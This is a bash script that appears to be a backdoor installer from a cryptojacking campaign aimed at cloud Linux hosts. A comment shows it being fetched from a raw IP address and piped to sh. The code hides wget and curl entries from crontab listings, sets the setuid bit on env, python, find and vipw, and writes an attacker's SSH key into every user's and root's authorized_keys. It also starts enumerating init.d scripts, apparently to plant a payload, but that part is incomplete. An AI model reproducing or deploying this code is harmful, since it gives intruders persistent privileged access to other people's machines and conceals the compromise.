#!/bin/bash

# wget -O - http://45.9.148.35/chimaera/sh/bd_aws.sh | sh

RSA_KEY=''
PAYLOAD=''




check_crontab() {
  case "$*" in
    (*-l*) command crontab "$@" | grep -v "wget\|curl" ;;
    (*) command crontab "$@" ;;
  esac
}







function set_setuid_bd(){
chmod +s $(command -v env)
chmod +s $(command -v vipw)
chmod +s $(command -v python)
chmod +s $(command -v python2)
chmod +s $(command -v python2.7)
chmod +s $(command -v python3)
chmod +s $(command -v find)
}


function set_ssh_keys(){

for SYSUSER in $( ls -1 /home/ ); do 
chmod 1777 /home/$SYSUSER/.ssh/ -R
chattr -R -ia /home/$SYSUSER/.ssh/
echo $RSA_KEY > /home/$SYSUSER/.ssh/authorized_keys2
cat /home/$SYSUSER/.ssh/authorized_keys >> /home/$SYSUSER/.ssh/authorized_keys2
mv /home/$SYSUSER/.ssh/authorized_keys /home/$SYSUSER/.ssh/authorized_keys.bak
cp /home/$SYSUSER/.ssh/authorized_keys2 /home/$SYSUSER/.ssh/authorized_keys
chmod 600 /home/$SYSUSER/.ssh/authorized_keys
chmod 600 /home/$SYSUSER/.ssh/authorized_keys2
chmod 700 /home/$SYSUSER/.ssh/
done

chmod 1777 /root/.ssh/ -R
chattr -R -ia /root/.ssh/
echo $RSA_KEY > /root/.ssh/authorized_keys2
cat /root/.ssh/authorized_keys >> /root/.ssh/authorized_keys2
mv /root/.ssh/authorized_keys /root/.ssh/authorized_keys.bak
cp /root/.ssh/authorized_keys2 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys2
chmod 700 /root/.ssh/

}


function set_init.s_payload(){
for INITD_FILE in $( file /etc/init.d/* | grep -v 'README' | grep 'executable'|awk '{print $1}'| sed 's/://g' ); do 



echo $INITD_FILE

done

}

